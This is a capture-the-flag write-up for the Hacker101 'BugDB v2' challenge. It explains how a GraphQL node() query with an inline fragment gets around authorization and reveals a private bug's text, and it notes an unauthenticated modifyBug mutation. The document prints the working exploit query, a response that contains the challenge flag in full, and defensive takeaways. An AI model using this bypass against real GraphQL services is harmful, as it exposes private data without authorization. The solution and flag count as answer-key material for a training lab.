# BugDB v2

**Platform:** HackerOne CTF
**Challenge:** BugDB v2
**Difficulty:** Easy
**Category:** Web
**Flags:** 1

---

## Overview

BugDB v2 is the successor to BugDB v1 — another GraphQL-based bug tracking application. It introduces a `modifyBug` mutation (still unauthenticated) and simplifies the type system (single `Bugs` type instead of `Bugs`/`Bugs_`), but the same `node()` interface authorization bypass persists.

**Server:** openresty/1.29.2.4, GraphQL

---

## Reconnaissance

### Application Behavior

Same as v1: root page links to `/graphql`. The GraphQL schema exposes:

| Operation | Type | Purpose |
|-----------|------|---------|
| `allBugs` | Query | List all non-private bugs (returns `[Bugs]` array) |
| `node(id:)` | Query | Access any object by global ID (resolves to Node interface) |
| `findUser(username:)` | Query | Lookup user by username |
| `findBug(_:)` | Query | Lookup bug (non-functional) |
| `allUsers` | Query | List all users |
| `modifyBug(id:, private:, text:)` | Mutation | Modify any bug (no auth required) |

### Key Findings

1. **Same `node()` bypass as v1.** Querying `node(id: "QnVnczoy")` with inline fragment `... on Bugs { text }` reveals the private bug's text.
2. **`allBugs` returns `[Bugs]` directly** (not a connection), and correctly filters out private bugs.
3. **New `modifyBug` mutation** is accessible without authentication — anyone can modify any bug's text and privacy setting.
4. **`Bugs` type now includes `reporterId`** but the reporter field wasn't fully queryable via `node()`.
5. **Only two bugs exist:** Bug 1 is public (example), Bug 2 is private (victim's, contains flag).

---

## Flag 0 — GraphQL Node Query Authorization Bypass

**Method:** Access private bug text via `node()` query with inline fragment

### Vulnerability

The `node(id:)` query on the `Query` type resolves objects via the `Node` interface, which `Bugs` implements. When queried with a `Bugs` inline fragment, it returns all `Bugs` fields including `text`, regardless of the `private` flag. The `allBugs` query correctly filters private bugs, but the `node()` interface has no such check.

This is the exact same vulnerability as BugDB v1 — the v2 changes (adding `modifyBug` mutation, simplifying type system) did not address the core authorization bypass.

### Exploit

```graphql
query {
    node(id: "QnVnczoy") {
        id
        ... on Bugs {
            text
            private
        }
    }
}
```

Response:
```json
{
    "data": {
        "node": {
            "id": "QnVnczoy",
            "text": "^FLAG^af5d38e90f8a13da907df97615c9cb11bfedf4d6bad56b63b97274eb55d46325$FLAG$",
            "private": true
        }
    }
}
```

> **Flag 0:** `^FLAG^<redacted>$FLAG$`

**Takeaway:** A version "upgrade" that doesn't address the reported vulnerability leaves the same bug exploitable. The `modifyBug` mutation addition was cosmetic — the core authorization issue on the `Node` interface resolver remains unfixed.

---

## Complete Flag List

| Flag | Hex | Technique |
|:----:|-----|-----------|
| 0 | `<redacted>` | GraphQL node() query bypass |

---

## Key Takeaways

1. **Version bumps don't mean bugs are fixed.** v2 added a mutation but left the same `node()` bypass intact.
2. **GraphQL interface authorization must be centralized.** Each implementation of `Node` must check authorization, not rely on field-level filtering at query resolvers.
3. **Mutations without auth are dangerous.** The `modifyBug` mutation works for anyone — combined with the `node()` read bypass, this is full CRUD on all bugs.
4. **Simplify but don't strip security.** The removal of `Bugs_` type simplified the schema but didn't fix the root cause.

---

## Files

| File | Description |
|------|-------------|
| `solve.py` | Complete PoC — enumerates bug IDs, accesses text via node() |

## Usage

```bash
pip install requests
python3 solve.py https://<instance-id>.ctf.hacker101.com/
```

---

## References

- [Hacker101 CTF Platform](https://ctf.hacker101.com/)
- [GraphQL Node Interface (Relay)](https://relay.dev/docs/guides/graphql-server-specification/)
